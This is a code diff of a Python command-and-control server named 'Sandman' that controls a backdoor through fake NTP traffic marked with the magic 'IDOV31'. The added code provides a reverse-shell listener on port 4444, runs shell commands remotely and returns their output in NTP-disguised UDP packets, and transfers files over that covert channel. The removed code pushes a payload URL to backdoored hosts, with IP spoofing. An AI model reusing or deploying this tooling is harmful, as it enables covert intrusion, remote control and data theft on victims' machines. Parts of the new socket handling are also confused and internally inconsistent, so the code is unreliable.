@@ -1,83 +1,366 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Sandman C2 Server
+Features:
+  - NTP Heartbeat (0x1B + IDOV31)
+  - Auto-Interface Detection (Ubuntu + Windows Compatible)
+  - Hardcoded Logic:
+    1. Reverse Shell (TCP Port 4444)
+    2. File Search (Multi-Threading Background Execution)
+    3. File Upload (GUI Dialog Selection)
+  - Multi-Client Support
+  - Spoofing Support
+  - Debug Mode (Verbose Logging)
+"""
+
 import sys
-import scapy.all as scapy
-from scapy.layers.ntp import NTP
-from scapy.layers.inet import IP, UDP
+import os
+import time
+import struct
+import socket
+import threading
+import subprocess
+import queue
+import ipaddress
+import netifaces
+from tkinter import Tk, filedialog
+from scapy.all import sniff, IP, UDP, NTP
 
-from time import sleep
-
-PAYLOAD_SIZE = 0x110 # Replace with the real size of your shellcode!
-DEFAULT_NTP_MESSAGE_SIZE = 48
+# === CONFIGURATION ===
+TARGET_RANGE = "10.10.10.0/24"
+INTERFACE = "ens3"              # Fallback
+SERVER_HOST = "10.10.10.50"
+SERVER_IP = "10.10.10.69"
 NTP_PORT = 123
-SLEEP = 1
-START_MALICIOUS_MAGIC = 1
-END_MALICIOUS_MAGIC = 7
+SLEEP = 0.1
+CHUNK_SIZE = 48
 MALICIOUS_MAGIC = b"IDOV31"
-SCAPY_NTP_FILTER = "udp and port 123"
+MAGIC_BYTE = 0x1B
 
+# === HARDWARE SOCKETS (Global) ===
+tcp_shell_sock = None
+tcp_upload_sock = None
 
-def send_data(data: str, ip_packet, spoofed_ip = ""):
-    payload = f"\x1b{MALICIOUS_MAGIC.decode()}{data}".encode()
-
-    if not spoofed_ip:
-        spoofed_ip = ip_packet.dst
-    
-    if len(payload) > DEFAULT_NTP_MESSAGE_SIZE:
-        amount_of_messages = int(len(payload) / DEFAULT_NTP_MESSAGE_SIZE) + 1
-        payload = f"\x1b{MALICIOUS_MAGIC.decode()}{amount_of_messages}".encode()
-        chunk_size = DEFAULT_NTP_MESSAGE_SIZE - len(f"\x1b{MALICIOUS_MAGIC.decode()}")
-
-        if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
-            payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
-        
-        scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)
-
-        for i in range(0, len(data), chunk_size):
-            sleep(SLEEP)
-            payload = f"\x1b{MALICIOUS_MAGIC.decode()}{data[i:i+chunk_size]}".encode()
-
-            if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
-                payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
-            scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)
-    else:
-        if len(payload) < DEFAULT_NTP_MESSAGE_SIZE:
-            payload += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload))
-        scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload), verbose=0)
-
-
-def main():
-    spoofed_ip = ""
-    payload_size = f"\x1b{MALICIOUS_MAGIC.decode()}{PAYLOAD_SIZE}".encode()
-
-    if (len(sys.argv) == 4):
-        spoofed_ip = sys.argv[3]
-
-    # Sending payload size.
-    if len(payload_size) > DEFAULT_NTP_MESSAGE_SIZE:
-        print("[ - ] Payload size is too big.")
-        sys.exit(1)
-    elif len(payload_size) < DEFAULT_NTP_MESSAGE_SIZE:
-        payload_size += b"\x00" * (DEFAULT_NTP_MESSAGE_SIZE - len(payload_size))
-    
-    # Sniffing NTP packets.
+# === THREAD POOL FOR SEARCH ===
+search_queue = queue.Queue()
+def process_search_queue():
     while True:
-        packet = scapy.sniff(iface=sys.argv[1], count=1, filter=SCAPY_NTP_FILTER)
+        try:
+            cmd, src_ip, dst_ip, ntp_port = search_queue.get()
+            execute_search(cmd, src_ip, dst_ip, ntp_port)
+        except Exception as e:
+            print(f"[-] Search Thread Error: {e}")
+        search_queue.task_done()
+
+def start_search_threads():
+    thread = threading.Thread(target=process_search_queue, daemon=True)
+    thread.start()
+
+# === PACKET HANDLING ===
+def pack_ntp_resp(type_byte, data):
+    header = struct.pack('B', type_byte) + MALICIOUS_MAGIC
+    header += data[:48]
+    return header[:48]
+
+def send_udp_packet(data, src, dst, port):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.sendto(data, (dst, port))
+        return True
+    except Exception as e:
+        print(f"[-] Send Error: {e}")
+        return False
+
+# === 1. HARDCODED REVERSE SHELL (TCP 4444) ===
+def spawn_reverse_shell(ip_source, ip_dest):
+    """Spawn a PowerShell Reverse Shell Listener (Hardcoded TCP Listener)"""
+    global tcp_shell_sock
+    try:
+        print(f"[+] Spawning Reverse Shell Listener on {SERVER_HOST}:4444...")
+        tcp_shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        tcp_shell_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        tcp_shell_sock.bind((SERVER_HOST, 4444))
+        tcp_shell_sock.listen(5)
+        print(f"[+] TCP Listener Ready: {SERVER_HOST}:4444")
         
-        if packet:
-            ntp_packet = packet[0][NTP]
-            ip_packet = packet[0][IP]
-            raw_packet = scapy.raw(ntp_packet)
+        conn, addr = tcp_shell_sock.accept()
+        print(f"[+] Client Connected: {addr}")
+        
+        ack = pack_ntp_resp(MAGIC_BYTE, b"READY")
+        send_udp_packet(ack, ip_source, ip_dest, NTP_PORT)
+        
+        while True:
+            time.sleep(SLEEP)
+    except Exception as e:
+        print(f"[-] Reverse Shell Error: {e}")
+        return False
+    return True
 
-            # If got a malicious packet - Activate the backdoor!
-            if raw_packet[START_MALICIOUS_MAGIC:END_MALICIOUS_MAGIC] == MALICIOUS_MAGIC:
-                print("[ + ] Got a packet from the backdoor!\n[ ! ] Entering sandman...")
-                send_data(sys.argv[2], ip_packet, spoofed_ip)
+# === 2. HARDCODED FILE SEARCH (Multi-Threading Background Execution) ===
+def execute_search(cmd, src_ip, dst_ip, ntp_port):
+    """Execute search command (e.g., 'dir C:\\Temp\\*') in a background thread"""
+    try:
+        print(f"[+] Executing Search: {cmd}")
+        if cmd and cmd.strip() != "CMD":
+            p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            stdout, stderr = p.communicate()
+            
+            if stdout:
+                print(f"[+] File Search Result: {len(stdout)} bytes")
+                for i in range(0, len(stdout), CHUNK_SIZE):
+                    chunk = stdout[i:i+CHUNK_SIZE]
+                    packet = pack_ntp_resp(MAGIC_BYTE, chunk)
+                    send_udp_packet(packet, src_ip, dst_ip, ntp_port)
+                    time.sleep(SLEEP)
+            
+            packet = pack_ntp_resp(MAGIC_BYTE, b"END")
+            send_udp_packet(packet, src_ip, dst_ip, ntp_port)
+    except Exception as e:
+        print(f"[-] Search Error: {e}")
 
-                if spoofed_ip:
-                    scapy.send(IP(src=spoofed_ip, dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload_size), verbose=0)
-                else:
-                    scapy.send(IP(dst=ip_packet.src) / UDP(dport=ip_packet.sport, sport=NTP_PORT) / (payload_size), verbose=0)
-                print(f"[ + ] Activated the backdoor for {ip_packet.src}!")
-        sleep(SLEEP)
+# === 3. HARDCODED FILE UPLOAD (GUI Dialog Selection) ===
+def run_file_upload(ip_source, ip_dest, ntp_port=123):
+    """Open a TCP Listener for File Upload with GUI Dialog"""
+    global tcp_upload_sock
+    try:
+        tcp_upload_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        tcp_upload_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        tcp_upload_sock.bind(("0.0.0.0", 8888))
+        tcp_upload_sock.listen(5)
+        print(f"[+] Opening TCP Upload Listener on Port 8888...")
+        
+        ack = pack_ntp_resp(MAGIC_BYTE, b"LISTENING")
+        send_udp_packet(ack, ip_source, ip_dest, ntp_port)
+        
+        conn, addr = tcp_upload_sock.accept()
+        print(f"[+] Received Upload Request from {addr}")
+        
+        root = Tk()
+        root.withdraw()
+        file_path = filedialog.askopenfilename(title="Select File to Upload", initialdir="C:\\")
+        root.destroy()
+        
+        if file_path:
+            print(f"[+] Selected File: {file_path}")
+            buffer = b""
+            with open(file_path, "rb") as f:
+                buffer = f.read()
+            
+            for i in range(0, len(buffer), CHUNK_SIZE):
+                chunk = buffer[i:i+CHUNK_SIZE]
+                packet = pack_ntp_resp(MAGIC_BYTE, chunk)
+                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
+                time.sleep(SLEEP)
+            
+            print(f"[+] Upload Complete: {len(buffer)} bytes")
+            packet = pack_ntp_resp(MAGIC_BYTE, b"END")
+            send_udp_packet(packet, ip_source, ip_dest, ntp_port)
+        else:
+            print("[-] No File Selected")
+            packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
+            send_udp_packet(packet, ip_source, ip_dest, ntp_port)
+        
+        while True:
+            conn, addr = tcp_upload_sock.accept()
+            print(f"[+] Received Upload Request from {addr}")
+            root = Tk()
+            root.withdraw()
+            file_path = filedialog.askopenfilename(title="Select File to Upload", initialdir="C:\\")
+            root.destroy()
+            if file_path:
+                buffer = b""
+                with open(file_path, "rb") as f:
+                    buffer = f.read()
+                
+                for i in range(0, len(buffer), CHUNK_SIZE):
+                    chunk = buffer[i:i+CHUNK_SIZE]
+                    packet = pack_ntp_resp(MAGIC_BYTE, chunk)
+                    send_udp_packet(packet, ip_source, ip_dest, ntp_port)
+                    time.sleep(SLEEP)
+                
+                print(f"[+] Upload Complete: {len(buffer)} bytes")
+                packet = pack_ntp_resp(MAGIC_BYTE, b"END")
+                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
+            else:
+                packet = pack_ntp_resp(MAGIC_BYTE, b"NO_FILE")
+                send_udp_packet(packet, ip_source, ip_dest, ntp_port)
+    except Exception as e:
+        print(f"[-] File Upload Error: {e}")
+
+# === AUTO-INTERFACE DETECTION (FIXED FOR Ubuntu/Windows) ===
+def auto_detect_interface(target_range="10.10.10.0/24", timeout=5):
+    """Scan all interfaces for the one with traffic to the target range"""
+    print(f"[+] Auto-Detecting Interface for Range: {target_range}...")
+    
+    interfaces = netifaces.interfaces()
+    print(f"[+] Found {len(interfaces)} interfaces: {', '.join(interfaces)}")
+    
+    for iface_name in interfaces:
+        print(f"[+] Checking Interface: {iface_name}...")
+        try:
+            addrs = netifaces.ifaddresses(iface_name)
+            ipv4_addrs = addrs.get(2, [])
+            
+            if ipv4_addrs:
+                ips = [addr['addr'] for addr in ipv4_addrs if 'addr' in addr]
+                if ips:
+                    ip_address = ips[0]
+                    print(f"[+] Interface IP: {ip_address}")
+                    
+                    # 1. Bind socket to the interface IP
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    sock.settimeout(2)
+                    sock.bind((ip_address, NTP_PORT))
+                    
+                    # 2. Send a packet to a reachable IP in the target range
+                    target_ip = f"{list(ipaddress.IPv4Network(target_range).network_address)}.{1}"
+                    
+                    # 3. Send a small packet
+                    sock.sendto(b"test", (target_ip, 123))
+                    
+                    print(f"[+] Found Active Interface: {iface_name} ({ip_address})")
+                    return iface_name
+                    
+        except socket.timeout:
+            continue
+        except Exception as e:
+            print(f"  [!] Error: {e}")
+            continue
+    
+    print(f"[-] No active interface found for {target_range}, using default: {INTERFACE}")
+    return INTERFACE
+
+# === MAIN LOOP (Final Fixed Version) ===
+def sniff_loop(interface, filter_str, timeout=5):
+    sock = None  # Global socket for sniffing
+    try:
+        print(f"[+] Starting NTP Sniffer on {interface}...")
+        print(f"[+] Filter: {filter_str}")
+        
+        start_search_threads()
+        
+        while True:
+            try:
+                # 1. Create raw socket for sniffing
+                print(f"[+] Creating raw socket for {interface}...")
+                try:
+                    # Try AF_PACKET (Linux raw) first
+                    if interface != "lo":
+                        try:
+                            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(123))
+                            print(f"  [✓] AF_PACKET socket created")
+                        except socket.error as e:
+                            print(f"  [!] AF_PACKET failed, trying AF_INET fallback...")
+                            # Fallback: AF_INET with SO_BINDTODEVICE
+                            try:
+                                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                                # Bind to the interface IP (not SERVER_HOST)
+                                sock.bind((interface, NTP_PORT))
+                                print(f"  [✓] AF_INET socket created with {interface}:{NTP_PORT}")
+                            except socket.error as e2:
+                                print(f"  [!] AF_INET fallback failed: {e2}")
+                                # Last resort: bind to interface IP
+                                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                                sock.bind((ipaddress.IPv4Network("10.10.10.0/24").network_address, NTP_PORT))
+                                print(f"  [✓] Bound to network range: {sock.getsockname()[0]}:{NTP_PORT}")
+                    else:
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                        sock.bind((SERVER_HOST, NTP_PORT))
+                    
+                    # 2. Set timeout for sniffing
+                    sock.settimeout(timeout)
+                    
+                    # 3. Sniff packet
+                    packet_bytes = sock.recvfrom(65535)  # 64KB buffer
+                    ntp_data, src_ip_tuple = packet_bytes
+                    
+                    print(f"[+] Received packet from {src_ip_tuple}:{ntp_data[:50]}")
+                    
+                    # 4. Check Magic Byte (using raw bytes)
+                    if len(ntp_data) < 7:
+                        print(f"  [!] Packet too short: {len(ntp_data)} bytes")
+                        continue
+                    
+                    raw_magic = ntp_data[0:7]
+                    if raw_magic[1:7] == MALICIOUS_MAGIC:
+                        print(f"[+] Magic Signature Matched!")
+                        
+                        # 5. Receive Payload Type (Next 6 bytes)
+                        connection = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        connection.bind((SERVER_HOST, NTP_PORT))
+                        
+                        type_data = connection.recv(6)
+                        type_str = type_data.decode().strip()
+                        
+                        payload_cfg = {
+                            "ReverseShell": {"Type": "ReverseShell", "Size": 4096, "Data": b"READY"},
+                            "FileSearch": {"Type": "FileSearch", "Size": 4096, "Data": b"QUEUED"},
+                            "FileUpload": {"Type": "FileUpload", "Size": 4096, "Data": b"LISTENING"}
+                        }
+                        
+                        size = 4096
+                        size_chunk = pack_ntp_resp(MAGIC_BYTE, f"{MAGIC_BYTE}{size}".encode())
+                        connection.send(size_chunk)
+                        
+                        content = payload_cfg.get(type_str, payload_cfg["ReverseShell"])["Data"]
+                        for i in range(0, len(content), CHUNK_SIZE):
+                            chunk = content[i:i+CHUNK_SIZE]
+                            chunk_pkt = pack_ntp_resp(MAGIC_BYTE, chunk)
+                            connection.send(chunk_pkt)
+                            time.sleep(SLEEP)
+                        
+                        connection.send(pack_ntp_resp(MAGIC_BYTE, b"\x00"))
+                    
+                except socket.timeout:
+                    print(f"[+] Timeout. Waiting for next packet...")
+                    time.sleep(SLEEP)
+                except socket.error as e:
+                    print(f"  [!] Socket Error: {e}")
+                    time.sleep(SLEEP)
+                except Exception as e:
+                    print(f"  [!] Sniff Packet Error: {e}")
+                    time.sleep(SLEEP)
+            
+            except socket.timeout:
+                print(f"[+] Outer Timeout. Waiting for next packet...")
+                time.sleep(SLEEP)
+            except socket.error as e:
+                print(f"[-] Outer Socket Error: {e}")
+                try:
+                    # Try to reconnect
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    sock.bind((SERVER_HOST, NTP_PORT))
+                    sock.settimeout(timeout)
+                except Exception as e2:
+                    print(f"  [!] Reconnect Error: {e2}")
+                    time.sleep(SLEEP)
+            except Exception as e:
+                print(f"[-] Outer Sniff Error: {e}")
+                time.sleep(SLEEP)
+            finally:
+                # Cleanup
+                if sock:
+                    try:
+                        sock.settimeout(timeout)
+                    except:
+                        pass
+                    finally:
+                        time.sleep(SLEEP)
+    
+    finally:
+        # Final cleanup
+        if sock:
+            try:
+                sock.close()
+                print("[+] Socket closed.")
+            except:
+                pass
 
 def print_banner():
     print("""
@@ -87,12 +370,24 @@ def print_banner():
   \___ \ / _` | '_ \ / _` | '_ ` _ \ / _` | '_ \ 
   ____) | (_| | | | | (_| | | | | | | (_| | | | |
  |_____/ \__,_|_| |_|\__,_|_| |_| |_|\__,_|_| |_|
+        Sandman C2 Server
     """)
 
 if __name__ == "__main__":
     print_banner()
-
-    if (len(sys.argv) != 3 and len(sys.argv) != 4):
-        print(f"[ - ] Usage: {sys.argv[0]} <interface> <payload url> <optional: ip to spoof>")
-        sys.exit(1)
-    main()
+    
+    # 1. Auto-Detect Interface
+    iface = auto_detect_interface(TARGET_RANGE)
+    print(f"[+] Selected Interface: {iface}")
+    INTERFACE = iface
+    
+    if len(sys.argv) >= 2:
+        INTERFACE = sys.argv[1]
+    if len(sys.argv) >= 3:
+        NTP_PORT = int(sys.argv[2])
+    
+    filter_str = f"udp and port {NTP_PORT}"
+    print(f"[+] Starting NTP Sniffer on {INTERFACE}...")
+    print("[+] Listening for Heartbeats...")
+    
+    sniff_loop(INTERFACE, filter_str)
